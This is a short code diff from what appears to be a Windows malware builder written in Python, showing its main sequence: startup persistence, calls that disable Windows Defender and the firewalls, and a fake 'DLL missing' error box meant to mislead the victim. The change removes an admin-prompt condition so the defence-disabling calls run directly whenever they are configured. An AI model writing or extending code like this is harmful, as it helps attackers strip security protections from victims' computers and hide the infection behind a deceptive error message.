@@ -45,11 +45,10 @@ if platform.system() != "Windows":
 if cc.get_start_up() is True:
     startup.Startup()
 
-if cc.get_ask_admin() is True:
-    if cc.get_disable_windows_defender() is True:
-        disableDefender.disableDefender()
-    if cc.get_disable_windows_firewalls() is True:
-        disableFirewalls.disableFirewalls()
+if cc.get_disable_windows_defender() is True:
+    disableDefender.disableDefender()
+if cc.get_disable_windows_firewalls() is True:
+    disableFirewalls.disableFirewalls()
 
 if cc.get_fake_error() is True:
     ctypes.windll.user32.MessageBoxW(0, "The program can't start because VLg7.ll is missing from your computer. Try reinstalling the program to fix this problem", "DDL missing", 16)
